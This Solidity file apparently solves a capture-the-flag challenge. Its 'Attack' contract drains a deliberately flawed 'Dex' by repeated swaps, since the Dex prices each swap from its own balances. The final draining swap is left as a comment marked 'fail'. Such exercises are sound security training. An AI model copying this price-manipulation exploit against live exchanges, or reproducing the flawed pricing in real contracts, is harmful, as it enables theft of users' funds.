// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/utils/math/SafeMath.sol';

contract Attack {
    address public token1;
    address public token2;
    Dex public d;

    constructor(Dex _d) {
        d = _d;
        token1 = d.token1();
        token2 = d.token2();
    }

    function attack() external {
        require(ERC20(token1).balanceOf(address(this)) == 10 && ERC20(token2).balanceOf(address(this)) == 10 );
        // swap from token 1 (10:100) to token 2 (10:100)
        ERC20(token1).approve(address(d), 10);
        d.swap(token1, token2, 10);
        // swap from token 2 (20:90) to token 1 (0:110)
        ERC20(token2).approve(address(d), 20);
        d.swap(token2, token1, 20);
        // swap from token 1 (24:86) to token 2 (0:110)
        ERC20(token1).approve(address(d), 24);
        d.swap(token1, token2, 24);
        // swap from token 2 (30:80) to token 1 (0:110)
        ERC20(token2).approve(address(d), 30);
        d.swap(token2, token1, 30);
        // swap from token 1 (41:69) to token 2 (0:110)
        ERC20(token1).approve(address(d), 41);
        d.swap(token1, token2, 41);
        // swap from token 2 (65:45) to token 1 (0:110)
        ERC20(token2).approve(address(d), 45);
        d.swap(token2, token1, 45);
        // swap from token 1 (110:0) to token 2 (20:90)
        // fail
    }
}

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
